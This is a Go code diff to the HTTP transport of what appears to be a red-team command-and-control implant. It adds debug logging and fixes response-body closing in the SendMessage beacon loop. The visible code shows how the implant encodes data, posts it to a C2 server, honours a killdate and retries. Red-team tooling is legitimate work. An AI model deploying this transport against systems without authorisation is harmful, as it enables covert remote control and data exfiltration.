@@ -423,7 +423,7 @@ func (c *C2HTTP) SendMessage(sendData []byte) []byte {
 	}
 	//fmt.Printf("Sending: %v\n", string(sendData))
 	sendDataBase64 := []byte(base64.StdEncoding.EncodeToString(sendData)) // Base64 encode and convert to raw bytes
-
+	//utils.PrintDebug(string(sendDataBase64))
 	if len(c.ProxyURL) > 0 {
 		proxyURL, _ := url.Parse(c.ProxyURL)
 		tr.Proxy = http.ProxyURL(proxyURL)
@@ -443,6 +443,7 @@ func (c *C2HTTP) SendMessage(sendData []byte) []byte {
 		//fmt.Printf("looping to send message: %v\n", sendDataBase64)
 		today := time.Now()
 		if today.After(c.Killdate) {
+			utils.PrintDebug(fmt.Sprintf("after killdate, exiting\n"))
 			os.Exit(1)
 		}
 		req, err := http.NewRequest("POST", targeturl, bytes.NewBuffer(sendDataBase64))
@@ -483,18 +484,30 @@ func (c *C2HTTP) SendMessage(sendData []byte) []byte {
 		}
 		if resp.StatusCode != 200 {
 			utils.PrintDebug(fmt.Sprintf("error resp.StatusCode: %v\n", resp.StatusCode))
+			err = resp.Body.Close()
+			if err != nil {
+				utils.PrintDebug(fmt.Sprintf("error failed to close response body: %v\n", err))
+			}
 			IncrementFailedConnection(c.ProfileName())
 			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
 			continue
 		}
-		defer resp.Body.Close()
 		body, err := io.ReadAll(resp.Body)
 		if err != nil {
 			utils.PrintDebug(fmt.Sprintf("error ioutil.ReadAll: %v\n", err))
+			err = resp.Body.Close()
+			if err != nil {
+				utils.PrintDebug(fmt.Sprintf("error failed to close response body: %v\n", err))
+			}
 			IncrementFailedConnection(c.ProfileName())
 			time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
 			continue
 		}
+		err = resp.Body.Close()
+		if err != nil {
+			utils.PrintDebug(fmt.Sprintf("error failed to close response body: %v\n", err))
+		}
+		//utils.PrintDebug(fmt.Sprintf("raw response: %s\n", string(body)))
 		raw, err := base64.StdEncoding.DecodeString(string(body))
 		if err != nil {
 			utils.PrintDebug(fmt.Sprintf("error base64.StdEncoding: %v\n", err))
@@ -518,10 +531,16 @@ func (c *C2HTTP) SendMessage(sendData []byte) []byte {
 				time.Sleep(time.Duration(c.GetSleepTime()) * time.Second)
 				continue
 			} else {
+				if i > 0 {
+					utils.PrintDebug(fmt.Sprintf("successfully sent message after %d failed attempts", i))
+				}
 				//fmt.Printf("decrypted response: %v\n%v\n", string(raw[:36]), string(enc_raw))
 				return enc_raw
 			}
 		} else {
+			if i > 0 {
+				utils.PrintDebug(fmt.Sprintf("successfully sent message after %d failed attempts", i))
+			}
 			//fmt.Printf("response: %v\n", string(raw))
 			return raw[36:]
 		}
